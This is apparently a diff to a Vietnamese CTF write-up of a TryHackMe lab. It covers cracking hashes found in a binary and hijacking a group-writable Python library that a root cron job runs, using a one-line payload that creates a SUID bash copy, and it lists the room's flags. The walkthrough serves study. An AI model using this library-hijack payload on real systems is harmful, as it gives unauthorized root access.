@@ -73,6 +73,69 @@
 
 - mật khẩu user: THM{k@l1_1n_th3_v@lley}<br>
 
+- truy cập vào thư mục home -> tìm ra 1 file thực thi nma thử cả 2 tài khoản tìm đc đều ko đúng:<br>
 
+![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/534e51f3-c6fc-401a-b71d-0b79d43409c8)<br>
 
+-> mk sẽ đọc thử file thực thi này để xem có tìm được gì ko (tài khoản khác): strings valleyAuthenticator<br>
+- ko xài đc strings thì get file về nhé: python3 -m http.server (ở home valley) và wget http://10.10.44.148:8000/valleyAuthenticator<br>
 
+![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/ff4fc50a-a9ba-46a8-ab7a-e990f823a322)<br>
+
+- thu được đoạn mã:<br>
+```
+e6722920bab2326f8217e4
+bf6b1b58ac
+ddJ1cc76ee3
+beb60709056cfbOW
+```
+- dùng tool: https://crackstation.net/ -> giải mã ta thu được: 	liberty123
+- thử với các user vừa nãy tìm đc:<br>
+
+![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/ccf6a167-5eb8-4f0c-8acd-22931622baf2)<br>
+
+- user valley nằm trong group userAdmin -> check: find / -group valleyAdmin -ls 2>/dev/null<br>
+
+![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/f23480df-5e39-4008-a9c0-68bbefd583cc)<br>
+
+-> tìm đc 1 file thuộc sở hữu root nma nằm trong group valleyAdmin -> thử thêm payload vào file:<br>
+```
+import os; os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
+```
+- tuy nhiên để file chạy được thì trên hệ thống cần chạy 1 file python nào đó có import thư viện base64 -> tìm kiếm thì thấy nó trong phần crontab:<br>
+- cat /etc/crontab<br>
+
+![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/b91f3761-268e-4910-92d4-341b6e95c563)<br>
+
+- cat /photos/script/photosEncrypt.py<br>
+```
+#!/usr/bin/python3
+import base64
+for i in range(1,7):
+# specify the path to the image file you want to encode
+        image_path = "/photos/p" + str(i) + ".jpg"
+
+# open the image file and read its contents
+        with open(image_path, "rb") as image_file:
+          image_data = image_file.read()
+
+# encode the image data in Base64 format
+        encoded_image_data = base64.b64encode(image_data)
+
+# specify the path to the output file
+        output_path = "/photos/photoVault/p" + str(i) + ".enc"
+
+# write the Base64-encoded image data to the output file
+        with open(output_path, "wb") as output_file:
+          output_file.write(encoded_image_data)
+```
+
+- check thư mục /tmp:<br>
+
+![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/46a9d80d-90b6-4e73-ac8b-4983f59e0048)<br>
+
+![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/58dff153-f290-4445-a62e-dc16f71b1fba)<br>
+
+![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/e09682a5-2b36-4cbd-9b8b-2e4237e868d8)<br>
+
+- mật khẩu root: THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
